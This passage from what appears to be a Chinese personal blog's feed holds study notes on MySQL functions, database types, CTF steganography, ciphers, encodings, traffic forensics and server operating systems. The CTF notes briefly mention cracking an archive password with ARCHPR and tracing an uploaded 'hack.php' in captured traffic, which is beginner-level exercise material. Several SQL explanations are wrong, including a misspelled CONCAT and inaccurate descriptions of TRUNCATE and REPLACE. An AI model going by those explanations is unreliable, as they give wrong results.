title="为字段起别名"></a>为字段起别名</h2><h3 id="便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来"><a href="#便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来" class="headerlink" title="便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来"></a>便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来</h3><h3 id="方式1：AS"><a href="#方式1：AS" class="headerlink" title="方式1：AS"></a>方式1：AS</h3><ol><li>select 100*98 AS 替换后的名字;</li><li>select last_name AS 姓,first_name AS 名 FROM table;<h3 id="方式2：空格"><a href="#方式2：空格" class="headerlink" title="方式2：空格"></a>方式2：空格</h3></li><li>select last_name 姓，first_name 名 FROM table;</li></ol><h3 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h3><ol><li>当有空格，井号等特殊符号时需要加单双引号</li><li>SELECT salary AS “out put” FROM employees;</li></ol><h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><h3 id="在字段前加上字段DISTINCT"><a href="#在字段前加上字段DISTINCT" class="headerlink" title="在字段前加上字段DISTINCT"></a>在字段前加上字段DISTINCT</h3><ol><li>SELECT DISTINCT department_id FROM employees;</li></ol><h2 id="的作用"><a href="#的作用" class="headerlink" title="+的作用"></a>+的作用</h2><h3 id="仅仅只有一个功能：运算符"><a href="#仅仅只有一个功能：运算符" class="headerlink" title="仅仅只有一个功能：运算符"></a>仅仅只有一个功能：运算符</h3><h3 id="只要有一个操作数为字符串，起连接符作用的java中-作用在mysql中不存在"><a href="#只要有一个操作数为字符串，起连接符作用的java中-作用在mysql中不存在" class="headerlink" title="只要有一个操作数为字符串，起连接符作用的java中+作用在mysql中不存在"></a>只要有一个操作数为字符串，起连接符作用的java中+作用在mysql中不存在</h3><ol><li>当其中一方为字符型，试图将字符型数据转换为数值型，成功则继续做加法运算，失败则将字符型数据转换为0</li><li>SELECT ‘123’ + 90得出213</li><li>SELECT ‘join’ + 90得出90</li><li>当一方为null则结果肯定为null（没有底数怎么加都没有结果）</li></ol><h1 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h1><ol><li>隐藏了实现细节</li><li>提高了代码的重用性<h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2></li><li>select 函数名(实参列表) [from 表]<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2></li><li>叫什么（函数名）</li><li>干什么（函数功能）</li></ol><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol><li>单行函数：contact length ifnull等只有一个返回值的函数</li><li>分组函数：做统计使用，缩小返回值的量，统计函数，聚合函数，组函数<h2 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h2></li><li>SELECT CONTACT(‘a’,’b’,’c’) AS 结果;得出abc</li></ol><h1 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h1><h2 id="length（是字节长度）"><a href="#length（是字节长度）" class="headerlink" title="length（是字节长度）"></a>length（是字节长度）</h2><ol><li>select length(‘join’) 4</li><li>select length(‘张三疯hahaha’) 15(看字符集判断汉字字节长度)<h2 id="concat拼接字符串"><a href="#concat拼接字符串" class="headerlink" title="concat拼接字符串"></a>concat拼接字符串</h2></li><li>SELECT CONCAT(last_name,’-‘,first_name) FROM employees;<h2 id="upper-lower"><a href="#upper-lower" class="headerlink" title="upper,lower"></a>upper,lower</h2></li><li>SELECT UPPER(‘join’); JOIN<h3 id="实例：将姓变大写，将名变小写"><a href="#实例：将姓变大写，将名变小写" class="headerlink" title="实例：将姓变大写，将名变小写"></a>实例：将姓变大写，将名变小写</h3></li><li>SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名 FROM employees;<h2 id="substr-substring"><a href="#substr-substring" class="headerlink" title="substr,substring"></a>substr,substring</h2><h3 id="索引从1开始"><a href="#索引从1开始" class="headerlink" title="索引从1开始"></a>索引从1开始</h3></li><li>SELECT SUBSTR(‘abcdef’,from) out_put:将从from到最后的字符选择<h3 id="截取指定长度的字符（一定是字符长度）"><a href="#截取指定长度的字符（一定是字符长度）" class="headerlink" title="截取指定长度的字符（一定是字符长度）"></a>截取指定长度的字符（一定是字符长度）</h3></li><li>SELECT SUBSTR(‘abcdef’,from,end) out_put</li></ol><h4 id="姓名用首字符大写，其他字符用小写后用——拼接"><a href="#姓名用首字符大写，其他字符用小写后用——拼接" class="headerlink" title="姓名用首字符大写，其他字符用小写后用——拼接"></a>姓名用首字符大写，其他字符用小写后用——拼接</h4><p>SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),’_’,LOWER(SUBSTR(last_name,2)));</p><h3 id="instr"><a href="#instr" class="headerlink" title="instr"></a>instr</h3><ol><li>用于返回字符的起始索引</li><li>SELECT INSTR(‘abcdef’,’def’) AS out_put</li><li>如果找不到返回0</li></ol><h2 id="trim"><a href="#trim" class="headerlink" title="trim:"></a>trim:</h2><ol><li>SELECT TRIM(‘   abcde    ‘) AS out_put</li><li>去掉字符串两侧的空格</li><li>python中是strip或者replace<h3 id="删去a"><a href="#删去a" class="headerlink" title="删去a:"></a>删去a:</h3></li><li>SELECT TRIM(‘a’ FROM ‘aaaaaaaa人名aaaaaaaaa人名aaaaa’)将删去两侧的a，中间的a不会删去</li></ol><h2 id="lpad"><a href="#lpad" class="headerlink" title="lpad"></a>lpad</h2><ol><li>用指定的字符实现左填充指定长度</li><li>SELECT LPAD(‘人名名’，10，’*’)</li></ol><h2 id="rpad"><a href="#rpad" class="headerlink" title="rpad"></a>rpad</h2><ol><li>用指定字符实现右填充</li><li>参数：待填充字符串，填充后长度，用于填充的字符串</li></ol><h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><ol><li>SELECT REPLACE(‘abcdefabcdef’,’a’,’b’) AS out_put</li><li>将字符串中的所有a和b都删去</li><li>参数：待删除字符串，后面都是需要删除的字符</li></ol><h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><ol><li>数学函数的第二位都是小数点后保留几位<h3 id="round"><a href="#round" class="headerlink" title="round"></a>round</h3></li><li>四舍五入</li><li>SELECT ROUND(x,y)</li><li>将x绝对值四舍五入，后删去正负号</li><li>y是保留小数点后的位数</li></ol><h3 id="ceil"><a href="#ceil" class="headerlink" title="ceil"></a>ceil</h3><ol><li>向上取整</li><li>返回大于等于该参数的最小整数</li></ol><h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><ol><li>向下取整</li><li>返回小于等于该参数的最大整数</li></ol><h2 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h2><ol><li>截断,无论后面是什么，都会四舍五入</li><li>SELECT TRUNCATE(1.69999,1) AS out_put:返回1.6</li></ol><h2 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h2><ol><li>SELECT MOD(10,3);</li><li>相当于SELECT 10 % 3;</li><li>被除数如果为正，则结果为正，否则为负</li><li>a-a/b*b   (除数一定返回的是整数，即被整除的值)</li></ol><h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><h3 id="now"><a href="#now" class="headerlink" title="now"></a>now</h3><ol><li>用于返回系统日期+时间</li></ol><h3 id="curdate"><a href="#curdate" class="headerlink" title="curdate"></a>curdate</h3><ol><li>用于返回系统日期，没有时间</li><li>与now的区别在于没有时间</li></ol><h3 id="curtime"><a href="#curtime" class="headerlink" title="curtime"></a>curtime</h3><ol><li>用于返回系统时间，不包含系统日期</li></ol><h3 id="可以获取指定部分，年，月，日，小时，分钟，秒"><a href="#可以获取指定部分，年，月，日，小时，分钟，秒" class="headerlink" title="可以获取指定部分，年，月，日，小时，分钟，秒"></a>可以获取指定部分，年，月，日，小时，分钟，秒</h3><ol><li>SELECT YEAR(NOW()) 年；</li><li>出现英文需要在函数后面加MONTH</li><li>SELECT MONTHNAME(NOW()) 年；</li></ol><h3 id="str-to-date-将日期格式的字符转换成指定格式的日期"><a href="#str-to-date-将日期格式的字符转换成指定格式的日期" class="headerlink" title="str_to_date:将日期格式的字符转换成指定格式的日期"></a>str_to_date:将日期格式的字符转换成指定格式的日期</h3><ol><li>STR_TO_DATE(‘7-29-2003’,’%Y-%m-%d’) 2003-07-29:</li><li>月份将转为两位</li><li><img src="https://s4.ax1x.com/2022/02/12/H0kaCt.png"></li><li>SELECT * FROM employees WHERE hiredate = STR_TO_DATE(‘4-3-1992’,’%c-%d %Y’)</li></ol><h3 id="date-format-将日期转换成字符"><a href="#date-format-将日期转换成字符" class="headerlink" title="date_format:将日期转换成字符"></a>date_format:将日期转换成字符</h3><ol><li>DATE_FORMAT(‘2003-07-29’,’%Y年%m月%d日’) 将返回2003年07月29日</li></ol><h2 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h2><ol><li>SELECT VERSION();版本号</li><li>SELECT DATABASES();查看数据库（注意有s表示复数）</li><li>SELECT USER();查看用户</li></ol><h2 id="流程控制函数"><a href="#流程控制函数" class="headerlink" title="流程控制函数"></a>流程控制函数</h2><h3 id="if函数"><a href="#if函数" class="headerlink" title="if函数"></a>if函数</h3><ol><li>if(exp1,exp2,exp3)</li><li>exp1是条件表达式，true or false</li><li>如果为true，则返回exp2的值</li><li>如果为false，则返回exp3的值</li><li>和py中的倒装句类似 （正确 if 条件 else 错误）</li></ol><h3 id="case函数"><a href="#case函数" class="headerlink" title="case函数"></a>case函数</h3><ol><li>case 要判断的字段或表达式</li><li>when 常量1 then 要显示的值1或语句1</li><li>when 常量2 then 要显示的值2或语句2</li><li>else 要显示的值n或语句n</li><li>end</li></ol><h4 id="等值判断"><a href="#等值判断" class="headerlink" title="等值判断"></a>等值判断</h4><ol><li>select salary 原始工资，departmant_id,</li><li>CASE department_id</li><li>WHEN 30 THEN salary*1.1</li><li>WHEN 40 THEN salary*1.2</li><li>WHEN 50 THEN salary*1.3</li><li>ELSE salary</li><li>END AS 新工资</li><li>FROM employees;</li></ol><h5 id="多重if判断区间"><a href="#多重if判断区间" class="headerlink" title="多重if判断区间"></a>多重if判断区间</h5><ol><li>SELECT salary</li><li>CASE</li><li>WHEN salary&gt;2 THEN ‘A’</li><li>WHEN salary&gt;1 THEN ‘B’</li><li>ELSE ‘D’</li><li>END AS 工资级别</li><li>FROM employees;</li></ol><h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h1><h2 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h2><h2 id="avg"><a href="#avg" class="headerlink" title="avg"></a>avg</h2><h2 id="max"><a href="#max" class="headerlink" title="max"></a>max</h2><h2 id="min"><a href="#min" class="headerlink" title="min"></a>min</h2><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库种类</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h1><h2 id="数据库是什么"><a href="#数据库是什么" class="headerlink" title="数据库是什么"></a>数据库是什么</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>将大量数据保存起来，通过计算机加工而成的可以进行高效访问的数据集合（database）</li><li>随时调用<h3 id="网状数据库"><a href="#网状数据库" class="headerlink" title="网状数据库"></a>网状数据库</h3></li><li>将数据从应用程序中独立出来进行集中管理（IDS）</li><li>层和层之间有联系<h3 id="层次数据库"><a href="#层次数据库" class="headerlink" title="层次数据库"></a>层次数据库</h3></li><li>层和层之间没有联系</li><li>使用树结构来描述实体和其之间关系的数据模型（IMS information management system）<h3 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h3></li><li>和excel表格一样，由行和列组成的二维表格来管理数据</li><li>使用SQL（structured query language,结构化查询语言）</li><li>可以处理表格数据但是不能很好的处理文本，图像，视频等</li><li>缺点：文件类型单一，只有表格的文档类型<h3 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h3></li><li>增加机器的数量，把数据库同时部署再多台机器上<h3 id="Nosql数据库"><a href="#Nosql数据库" class="headerlink" title="Nosql数据库"></a>Nosql数据库</h3></li><li>为了解决大规模数据集合和多种数据种类带来的挑战，Nosql应运而生</li><li>灵活的数据模型，高拓展性，高可用性，但是不支持SQL查询</li><li>主要包括：文档数据库，列簇式数据库，键值数据库，图 数据库</li><li>HBase，MongoDB</li><li>缺点：不支持高度结构化查询，不能体哦概念股ACID（原子性，一致性，隔离性，持久性）<h3 id="NewSQL数据库"><a href="#NewSQL数据库" class="headerlink" title="NewSQL数据库"></a>NewSQL数据库</h3></li><li>对各种新的可拓展/高性能数据库的简称，不仅具有Nosql对海量数据的存储管理能力，还保持了ACID和SQL等性能<h3 id="云数据库"><a href="#云数据库" class="headerlink" title="云数据库"></a>云数据库</h3></li><li>将传统的数据库系统配置到云上，由专门的云服务提供商进行云上数据库系统的管理和部署工作</li><li>通过计算存储分离，存储在线扩容，计算弹性伸缩来提升数据库的可用性和可靠性<h2 id="数据库管理系统-DBMS"><a href="#数据库管理系统-DBMS" class="headerlink" title="数据库管理系统 DBMS"></a>数据库管理系统 DBMS</h2></li></ol><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><ol><li>在命令窗口链接（需要设置环境变量）<br>mysql -u root -p<br>mysql -h IP -u 用户名 -p</li><li>workbench链接</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF杂项1</title>
      <link href="/CTF%E6%9D%82%E9%A1%B91/"/>
      <url>/CTF%E6%9D%82%E9%A1%B91/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF杂项1"><a href="#CTF杂项1" class="headerlink" title="CTF杂项1"></a>CTF杂项1</h1><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h3 id="载体"><a href="#载体" class="headerlink" title="载体"></a>载体</h3><ol><li>图片</li><li>音频</li><li>视频</li><li>压缩包<h2 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h2></li><li>颜色差别(LSB隐写)</li><li>gif多帧隐藏</li><li>exif信息隐藏（藏在图片的exif信息中）</li><li>图片修复<h3 id="LSB最低有效位隐写"><a href="#LSB最低有效位隐写" class="headerlink" title="LSB最低有效位隐写"></a>LSB最低有效位隐写</h3></li><li>利用RGB</li><li>红色十进制为255，二进制为1111，1111（8个1）</li><li>通过修改像素最低位的1bit来达到隐藏的效果</li><li>工具：stegsolve</li><li>点击左右查看不同色位的信息<h3 id="图像隐写-1"><a href="#图像隐写-1" class="headerlink" title="图像隐写"></a>图像隐写</h3></li><li>信息隐藏在动态图中</li><li>stegsolve中框架浏览器frame brouser<h3 id="Exif信息隐写"><a href="#Exif信息隐写" class="headerlink" title="Exif信息隐写"></a>Exif信息隐写</h3></li><li>照片中的EXIF属性可以保存大量的信息</li><li>windows右击查看图像属性<h3 id="图像修复"><a href="#图像修复" class="headerlink" title="图像修复"></a>图像修复</h3><h4 id="图像类型"><a href="#图像类型" class="headerlink" title="图像类型"></a>图像类型</h4></li><li>jpeg/jpg 文件头：（2byte）FF D8 文件结束：（2byte）FF D9</li><li>png(8byte):89 50 4E 47 0D 0A 1A 0A</li><li>gif(6byte):47 49 46 38 39(37) 61</li><li>BMP(2byte):42 4D</li><li>参考博客<a href="https://www.cnblogs.com/senior-engineer/p/9541719.html">https://www.cnblogs.com/senior-engineer/p/9541719.html</a></li><li>常用类型博客参考<a href="https://blog.csdn.net/xiaolong22333/article/details/107498232">https://blog.csdn.net/xiaolong22333/article/details/107498232</a><h4 id="修改图片大小"><a href="#修改图片大小" class="headerlink" title="修改图片大小"></a>修改图片大小</h4></li><li>第二行的前四位是宽，后四位是高<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3></li><li>winhex修复文件头<h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3></li><li>信息隐藏在声音里（逆序）</li><li>信息隐藏在数据里<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3></li><li>Adoube Audition<h4 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h4></li><li>拉到Adobe Audition里面是下面这个样子。我们可以手动比照上面那个表格得到数字，也可以用dtmf2num.exe自动解码。</li><li>MP3Stego<h4 id="Decode-exe-X-文件名-P-密码"><a href="#Decode-exe-X-文件名-P-密码" class="headerlink" title="Decode.exe -X 文件名 -P 密码"></a>Decode.exe -X 文件名 -P 密码</h4></li><li>-X后面是隐藏的东西 -P后面写密码</li><li>****1.开始-&gt;运行-&gt;CMD</li><li>进入某个磁盘，直接盘符代号：如D：，不用CD 命令切换</li><li>进入除根录以下的文件夹 cd 文件夹路径 例如我要进入 E:/Program Files/PHP 就<br>输入 E：回车<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4></li><li>将没有隐藏信息的部分删掉</li><li>若有莫斯电码信息，则减弱左声道，加强右声道或倒过来<h3 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h3></li><li>信息一女昂在视频的某个或多个帧中</li><li>Premiere<h3 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写"></a>文件隐写</h3></li><li>文件拼接</li><li>简单的可以直接使用Windows下的文件拼接命令copy /b 1.jpg+2.zip output.jpg<h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4></li><li>binwalk</li><li>dd</li><li>winhex</li></ol><h1 id="md5解密网站"><a href="#md5解密网站" class="headerlink" title="md5解密网站"></a>md5解密网站</h1><ol><li><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li><li>MD5算法特点：</li><li>压缩性：任意长度的数据，算出的MD5值长度都是固定的</li><li>容易计算，从原数据计算出的MD5值很容易<h1 id="base64解密网站"><a href="#base64解密网站" class="headerlink" title="base64解密网站"></a>base64解密网站</h1></li><li><a href="https://the-x.cn/base64">https://the-x.cn/base64</a></li><li>这个网站对格式要求不是很高，且能够报错</li></ol><h1 id="密码学及编码"><a href="#密码学及编码" class="headerlink" title="密码学及编码"></a>密码学及编码</h1><ol><li>古典密码可以分为置换密码和替换密码<h2 id="位移密码"><a href="#位移密码" class="headerlink" title="位移密码"></a>位移密码</h2></li><li>凯撒密码</li><li>每一个字母顺序移动几个位置，key值即为偏移量<h2 id="解密方法（对key值进行解密）"><a href="#解密方法（对key值进行解密）" class="headerlink" title="解密方法（对key值进行解密）"></a>解密方法（对key值进行解密）</h2></li><li>手动解密</li><li>在线工具</li><li>python中的pycipher模块</li><li>from pycipher import Caesar</li><li>Caesar(key=设置).encipher(“待引入”)<h3 id="特殊形式ROT13"><a href="#特殊形式ROT13" class="headerlink" title="特殊形式ROT13"></a>特殊形式ROT13</h3></li><li>相当于凯撒加密的key=13</li><li>加密和解密是一个循环</li><li>一共26个英文字母，相当于是跑了一边英文字母<h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2></li><li>一维的加密(分组密码)</li><li>栏数必须为密文长度的约数，明文长度与密文长度相同<h2 id="弗吉尼亚密码"><a href="#弗吉尼亚密码" class="headerlink" title="弗吉尼亚密码"></a>弗吉尼亚密码</h2></li><li>二维的加密<h3 id="工具：在线解密，脚本"><a href="#工具：在线解密，脚本" class="headerlink" title="工具：在线解密，脚本"></a>工具：在线解密，脚本</h3></li><li>输入明文</li><li>输入密钥<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2></li><li>加密和解密使用相同密钥</li><li>DES，3DES，AES</li><li>使用在线工具进行解密<h2 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h2></li><li>如果使用公钥进行加密，则用对应的私钥才能解密</li><li>如果使用私钥，则需要使用公钥</li><li>RSA,Elgamal,背包算法，Rabin,D-H,ECC<h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2></li><li>直线和点组成的图形</li><li><a href="https://imgtu.com/i/qMyOud"><img src="https://s1.ax1x.com/2022/03/22/qMyOud.png" alt="qMyOud.png"></a><h2 id="培根密码：由a和b构成的替换密码"><a href="#培根密码：由a和b构成的替换密码" class="headerlink" title="培根密码：由a和b构成的替换密码"></a>培根密码：由a和b构成的替换密码</h2></li><li>可以将a理解为0</li><li>b理解为1</li><li><a href="https://imgtu.com/i/qM6K8U"><img src="https://s1.ax1x.com/2022/03/22/qM6K8U.png" alt="qM6K8U.png"></a><h2 id="键盘密码：电脑键盘位置连线画出图案"><a href="#键盘密码：电脑键盘位置连线画出图案" class="headerlink" title="键盘密码：电脑键盘位置连线画出图案"></a>键盘密码：电脑键盘位置连线画出图案</h2></li><li>连线得到的是字母图案<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2></li><li>通过密钥和密文可以还原原始信息<h2 id="编码："><a href="#编码：" class="headerlink" title="编码："></a>编码：</h2></li><li>将数据转化成某种固定的格式的编码信息，方便不同系统之间的传输<h2 id="散列："><a href="#散列：" class="headerlink" title="散列："></a>散列：</h2></li><li>哈希值，验证完整性，不能解码<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3></li><li>莫斯电码，HTML编码，二维码也算是编码</li><li>base64编码文本末尾输出字符使用=，所以编码后输出的文本末尾可能会出现一个或两个=</li></ol><h1 id="解码网站汇总"><a href="#解码网站汇总" class="headerlink" title="解码网站汇总"></a>解码网站汇总</h1><ol><li><a href="https://daimajiaoliu.com/daima/8c7941818c4d408">https://daimajiaoliu.com/daima/8c7941818c4d408</a></li></ol><h1 id="各种编码特点"><a href="#各种编码特点" class="headerlink" title="各种编码特点"></a>各种编码特点</h1><ol><li>参考博客：<a href="https://cloud.tencent.com/developer/article/1748394">https://cloud.tencent.com/developer/article/1748394</a></li><li>1、MD5——示例21232F297A57A5A743894A0E4A801FC3<br>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。</li><li>2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997<br>这种加密的密文特征跟MD5差不多，只不过位数是40</li><li>1、Base64——示例YWRtaW4tcm9vdA==<br>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</li><li>2、Base58——示例6tmHCZvhgfNjQu<br>它最大的特点是没有等号</li><li>3、Base32——示例GEZDGNBVGY3TQOJQGE======<br>他的特点是明文超过十个后面就会有很多等号</li><li>4、Base16——示例61646D696E<br>它的特点是没有等号并且数字要多于字母</li><li>5、Base85——示例@:X4hDWe0rkE(G[OdP4CT]N#<br>特点是奇怪的字符比较多，但是很难出现等号</li><li>6、Base100——示例:emoji<br>特点就是一堆Emoji表情<h1 id="各种密码特点"><a href="#各种密码特点" class="headerlink" title="各种密码特点"></a>各种密码特点</h1></li><li>1、凯撒密码——示例iodj{khoor_zrug_123}<br>只对字母进行加密，常用于CTF比赛中</li><li>2、维吉尼亚密码——示例fmcg{iglmq_wptd_123}<br>可以说是凯撒密码的加强版，引入了密钥</li></ol><h1 id="隐写术工具"><a href="#隐写术工具" class="headerlink" title="隐写术工具"></a>隐写术工具</h1><h2 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h2><ol><li>图片隐写术</li><li>扫出二维码可以用手机qq，微信，cortexscan</li><li>也可以逐帧分析gif，点击frame browser进入帧预览功能<h2 id="winhex-010editor-导出或导入16进制处理txt形式的文件"><a href="#winhex-010editor-导出或导入16进制处理txt形式的文件" class="headerlink" title="winhex/010editor(导出或导入16进制处理txt形式的文件)"></a>winhex/010editor(导出或导入16进制处理txt形式的文件)</h2><h2 id="photoshop（图形拼接）"><a href="#photoshop（图形拼接）" class="headerlink" title="photoshop（图形拼接）"></a>photoshop（图形拼接）</h2></li><li>矩形选框功能选出条形码</li><li>ctrl+c进行复制</li><li>右下角创建图层</li><li>使用选择工具移动<h2 id="Adobe-Auditon"><a href="#Adobe-Auditon" class="headerlink" title="Adobe Auditon"></a>Adobe Auditon</h2></li><li>右侧的L和R分别代表左右声道，可以打开或关闭左右声道</li><li>上方的hms一栏中可以增大音符<h2 id="搜索加解密工具"><a href="#搜索加解密工具" class="headerlink" title="搜索加解密工具"></a>搜索加解密工具</h2><h2 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h2></li><li>最上方一栏decoder可以实现编码和解码</li><li>encode实现加密（选择编码方式）</li><li>decode实现解密（选择解码方式）<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2></li><li>先cat一下看看里面有什么</li><li>检测隐写的东西里面有什么</li><li>binwalk 文件（命令），即可检测出里面有什么东西<h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2></li><li>foremost 文件名（命令），即可分离出里面隐藏的东西</li></ol><h1 id="CTF取证技术"><a href="#CTF取证技术" class="headerlink" title="CTF取证技术"></a>CTF取证技术</h1><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h4 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h4><ol><li>点击右侧表达式，使用wireshark内在表达式进行过滤</li><li>筛选协议：http,ftp等</li><li>ip.addr == 192.168.1.1</li><li>也可以使用表达式中的逻辑运算符进行运算<h4 id="追踪流"><a href="#追踪流" class="headerlink" title="追踪流"></a>追踪流</h4></li><li>右击追踪流</li><li>选择TCP/UDP/SSL/HTTP</li><li>弹出的窗口中选择查找下一个<h4 id="文件导出"><a href="#文件导出" class="headerlink" title="文件导出"></a>文件导出</h4></li><li>Export Objects,选择不同类型</li></ol><h5 id="被偷走的文件和秘密文件"><a href="#被偷走的文件和秘密文件" class="headerlink" title="被偷走的文件和秘密文件"></a>被偷走的文件和秘密文件</h5><ol><li>题目给出入侵时的秘密文件，分析ftp流量包</li><li>追踪流</li><li>发现有rar文件，使用binwalk -e进行分离</li><li>分离出rar文件，使用ARCHPR进行爆破，得到flag</li></ol><h3 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h3><ol><li>点击上方筛选</li><li>查看所有upload中hack.php信息</li><li>右击，选择follow，追踪http流</li></ol><h3 id="四种流"><a href="#四种流" class="headerlink" title="四种流"></a>四种流</h3><ol><li>GET用来获取资源，只是获取，查询数据，不会修改服务器的数据</li><li>POST可以向服务器发送修改请求，进行数据的修改。</li></ol><h3 id="不同文件类型的文件头"><a href="#不同文件类型的文件头" class="headerlink" title="不同文件类型的文件头"></a>不同文件类型的文件头</h3><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h2 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h2><h3 id="即日志分析"><a href="#即日志分析" class="headerlink" title="即日志分析"></a>即日志分析</h3><p>访问IP+访问时间+访问方式+访问路径+访问版本+响应</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器系统</title>
      <link href="/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器系统"><a href="#服务器系统" class="headerlink" title="服务器系统"></a>服务器系统</h1><h2 id="即服务器的操作系统"><a href="#即服务器的操作系统" class="headerlink" title="即服务器的操作系统"></a>即服务器的操作系统</h2><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="windows-server"><a href="#windows-server" class="headerlink" title="windows server"></a>windows server</h3><ol><li><p>对存储装置管控更安全</p></li><li><p>不提供32位版本</p><h3 id="netware"><a href="#netware" class="headerlink" title="netware"></a>netware</h3></li><li><p>以文件服务器为中心，主要由三部分组成：文件服务器内核，工作站外壳，低层通信协议</p><h3 id="unix"><a href="#unix" class="headerlink" title="unix"></a>unix</h3></li><li><p>多用户，多任务的分时操作系统</p></li><li><p>结构：操作系统内核，系统调用，应用程序</p></li><li><p>功能强大的可编程的Shell语言(外壳语言);</p></li><li><p>采用树状目录结构，具有良好的安全性，保密性和可维护性;</p></li><li><p>采用进程对换(Swapping)的内存管理机制和请求调页的存储方式，实现虚拟内存管理，内存的使用效率大增;</p></li><li><p>多种通信机制，如：管道通信，软中断通信，消息通信，共享存储器通信，信号灯通信。</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3></li><li><p>类unix操作系统，多用户，多任务，支持多线程和多CPU的操作系统</p></li><li><p>思想：一切都是文件，每个软件都有确定的用途</p></li><li><p>多用户，多任务：各个用户对于自己的文件设备有自己特殊的权利；多个程序可以同时并独立的运行</p></li><li><p>同时字符界面和图形界面</p></li></ol>]]></content>
      
      
      <categories>
          
